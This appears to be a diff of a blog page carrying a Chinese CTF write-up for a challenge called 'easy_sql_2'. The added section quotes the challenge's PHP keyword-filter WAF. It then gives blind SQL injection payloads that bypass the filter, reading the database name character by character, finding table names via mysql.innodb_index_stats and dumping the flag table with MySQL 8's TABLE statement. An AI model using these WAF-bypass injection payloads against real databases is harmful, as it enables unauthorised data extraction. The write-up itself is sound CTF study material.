@@ -164,7 +164,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/0045.jpg') no-repeat center center;
+         style="background: url('/img/0045.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -191,7 +191,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      916 字
+      1.1k 字
     </span>
   
 
@@ -201,7 +201,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      35
+      42
        分钟
     </span>
   
@@ -382,7 +382,33 @@ headers=&#123;
 r=requests.get(url,params=params,headers=headers)
 print(r.text)</code></pre></div>
 
-<h2 id="easy-sql-2"><a href="#easy-sql-2" class="headerlink" title="easy_sql_2"></a>easy_sql_2</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<h2 id="easy-sql-2"><a href="#easy-sql-2" class="headerlink" title="easy_sql_2"></a>easy_sql_2</h2><p>WAF:</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/select|;|creat|like|insert| |sys|drop|union|file|show|rename|handler|alter|sys|if|prepare|execute|tables|delete|where\./i&quot;</span>, $value))&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;try again!&#x27;</span>);
+    <span class="hljs-keyword">exit</span>();
+&#125;</code></pre></div>
+
+<p>注库名：</p>
+<div class="hljs"><pre><code class="hljs sql">(ascii(substr(database(),&#123;i&#125;,1)))=&#123;val&#125;</code></pre></div>
+
+<p>tables被过，不能用<code>information_schema.tables</code>;</p>
+<p>mysql8中有<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code>;以此获取表名</p>
+<div class="hljs"><pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre></div>
+
+<p>select 被过，用MySQL8的table语句</p>
+<div class="hljs"><pre><code class="hljs sql">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code></pre></div>
+
+<p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p>
+<ul>
+<li><code>table</code>总是显示表的所有列</li>
+<li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。<br> 可以用来盲注表名</li>
+</ul>
+<div class="hljs"><pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre></div>
+
+<p>注数据</p>
+<div class="hljs"><pre><code class="hljs sql">(ascii(substr(hex((table fl11aag limit 1,1)),&#123;i&#125;,1)))=&#123;val&#125;</code></pre></div>
+
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">import</span> string
 <span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep
 
@@ -448,6 +474,12 @@ flag=<span class="hljs-string">&quot;flag&#123;&quot;</span>
                 <div class="post-prevnext row">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2021/10/29/DAS/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DAS X 吉林工师</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
